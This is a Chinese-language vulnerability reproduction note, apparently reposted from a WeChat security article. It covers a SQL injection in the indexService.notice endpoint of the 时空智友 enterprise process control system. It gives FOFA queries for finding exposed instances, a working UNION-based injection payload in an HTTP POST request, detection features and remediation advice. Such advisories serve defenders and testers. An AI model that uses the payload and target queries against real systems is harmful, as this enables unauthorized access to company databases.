# 漏洞复现 | 时空智友企业流程化管控系统 indexService.notice SQL注入漏洞

## 漏洞信息

| 属性 | 值 |
|------|-----|
| 漏洞名称 | 时空智友企业流程化管控系统 indexService.notice SQL注入漏洞 |
| 漏洞类型 | SQL注入 |
| 组件 | 时空智友企业流程化管控系统 |
| 严重程度 | 高危 |

## 漏洞概述

时空智友企业流程化管控系统indexService.notice接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句获取数据库敏感信息。

## FOFA查询语法

```ini
app="时空智友"
```

或者基于关键字搜索：
```ini
title="时空智友" || header="时空智友"
```

## 漏洞复现

### POC

**SQL注入 payload**
```http
POST /formservice?service=indexService.notice HTTP/1.1
Host: target
Content-Type: application/json
Content-Length: 60

{"id":"1' UNION ALL SELECT NULL, NULL, @@version, NULL, NULL--"}
```

### 特征

- 路径：`/formservice?service=indexService.notice`
- 方法：POST
- 参数：`id`
- 类型：UNION注入
- 特征：`indexService.notice`

## 修复建议

1. 对用户输入进行严格过滤和参数化查询
2. 升级系统到最新安全版本
3. 限制接口访问权限
4. 部署Web应用防火墙

---

*来源：实战安全研究 | 原文链接：https://mp.weixin.qq.com/s/3T3oel2xFSZG_FbrWd0tyQ*